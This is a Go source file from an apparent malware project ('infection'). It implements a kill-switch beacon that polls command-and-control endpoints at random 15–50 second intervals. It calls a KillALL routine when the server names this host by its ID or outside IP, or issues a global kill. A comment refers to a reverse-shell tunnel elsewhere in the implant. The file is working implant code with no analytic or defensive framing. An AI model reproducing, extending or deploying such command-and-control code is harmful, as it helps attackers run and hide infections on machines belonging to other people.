package killit

import (
	"encoding/json"
	"github.com/parnurzeal/gorequest"
	"infection/util/lib"
	"time"
)

type Check struct {
	Hostid string `json:"hostid"`
}

// ioop wait master call died
func Killit() {
	var check Check
	for {
		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(15, 50)))
		resp, body, _ := gorequest.New().
			Get(lib.MIDKILLIP).
			End()
		if resp.StatusCode == 200 && body != "" {
			if err := json.Unmarshal([]byte(body), &check); err == nil {
				// if not need  dont open the tunnel to revert shell
				if check.Hostid == lib.HOSTID || check.Hostid == lib.OUTIP {
					lib.KillALL()
				} else {
					aresp, abody, _ := gorequest.New().
						Get(lib.ALLKILL).
						End()
					if aresp.StatusCode == 200 && abody != "" {
						if err := json.Unmarshal([]byte(abody), &check); err == nil {
							if check.Hostid == "0" {
								lib.KillALL()
							}
						}

					}
				}
			}
		}
		<-ticker.C
	}
}
